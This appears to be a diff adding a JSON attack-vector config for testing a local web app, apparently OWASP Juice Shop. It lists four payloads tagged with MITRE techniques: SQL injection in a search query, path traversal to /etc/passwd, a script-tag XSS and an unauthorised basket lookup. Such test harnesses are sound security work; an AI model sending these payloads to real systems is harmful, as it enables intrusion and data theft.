@@ -1,0 +1,29 @@
+{
+  "target_base_url": "http://localhost:3000",
+  "vectors": [
+    {
+      "id": "sqli-t1190",
+      "mitre_technique": "T1190",
+      "method": "GET",
+      "path": "/rest/products/search?q=' OR 1=1--"
+    },
+    {
+      "id": "lfi-t1083",
+      "mitre_technique": "T1083",
+      "method": "GET",
+      "path": "/ftp/..%2F..%2Fetc%2Fpasswd"
+    },
+    {
+      "id": "xss-t1189",
+      "mitre_technique": "T1189",
+      "method": "GET",
+      "path": "/rest/track-order/123<script>alert(1)</script>"
+    },
+    {
+      "id": "bola-t1068",
+      "mitre_technique": "T1068",
+      "method": "GET",
+      "path": "/rest/basket/2"
+    }
+  ]
+}
